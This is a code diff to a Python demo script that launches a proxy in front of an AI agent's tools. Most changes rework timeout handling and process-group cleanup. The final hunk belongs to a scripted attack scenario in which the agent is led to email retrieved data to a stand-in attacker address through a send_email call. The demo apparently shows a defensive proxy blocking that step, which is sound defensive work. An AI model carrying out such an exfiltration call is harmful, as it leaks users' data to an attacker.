@@ -65,9 +65,7 @@ class Session:
         try:
             line = self.lines.get(timeout=READ_TIMEOUT)
         except queue.Empty:
-            # Print now: close() runs next in main's finally and may exit with its own message.
-            print("proxy did not answer %s within %ds" % (method, READ_TIMEOUT), file=sys.stderr)
-            sys.exit(1)
+            sys.exit("proxy did not answer %s within %ds:\n%s" % (method, READ_TIMEOUT, self._stderr_text()))
         if not line:
             sys.exit("proxy closed the connection:\n" + self._stderr_text())
         return json.loads(line)
@@ -75,29 +73,43 @@ class Session:
     def call(self, tool, arguments):
         return self.send("tools/call", {"name": tool, "arguments": arguments})
 
-    def close(self):
-        """Stop the proxy and its upstream; fail loudly if the proxy did not exit cleanly."""
+    def close(self, check=True):
+        """Stop the proxy and everything it started.
+
+        With check=True, fail loudly if the proxy did not exit cleanly. main()
+        passes check=False while an earlier failure is already propagating, so
+        that failure's message is the one the user sees.
+        """
         try:
             self.proc.stdin.close()
         except BrokenPipeError:
             pass
         try:
             self.proc.wait(timeout=EXIT_TIMEOUT)
+            timed_out = False
         except subprocess.TimeoutExpired:
-            for sig, grace in ((signal.SIGTERM, 3), (signal.SIGKILL, None)):
-                try:
-                    os.killpg(self.proc.pid, sig)
-                except ProcessLookupError:
-                    break
-                try:
-                    self.proc.wait(timeout=grace)
-                    break
-                except subprocess.TimeoutExpired:
-                    continue
+            timed_out = True
+            self._signal_group(signal.SIGTERM)
+            try:
+                self.proc.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                pass
+        # Always finish with SIGKILL on the whole group: the proxy exiting does
+        # not mean its upstream did, and a descendant may ignore SIGTERM.
+        self._signal_group(signal.SIGKILL)
+        self.proc.wait()
+        if not check:
+            return
+        if timed_out:
             sys.exit("proxy did not exit within %ds and was killed:\n%s" % (EXIT_TIMEOUT, self._stderr_text()))
         if self.proc.returncode != 0:
             sys.exit("proxy exited with status %d:\n%s" % (self.proc.returncode, self._stderr_text()))
 
+    def _signal_group(self, sig):
+        try:
+            os.killpg(self.proc.pid, sig)
+        except (ProcessLookupError, PermissionError):
+            pass
 
 def show_call(resp):
     """Print what the agent sees and return the result text (None if blocked)."""
@@ -141,8 +153,10 @@ def main():
         print('\n3. The agent emails whatever it got back to the attacker.')
         print('   call: send_email(to="%s", body=<result of step 2>)' % ATTACKER)
         show_call(s.call("send_email", {"to": ATTACKER, "body": body}))
-    finally:
-        s.close()
+    except BaseException:
+        s.close(check=False)
+        raise
+    s.close()
     show_trail(audit_path)
 
 
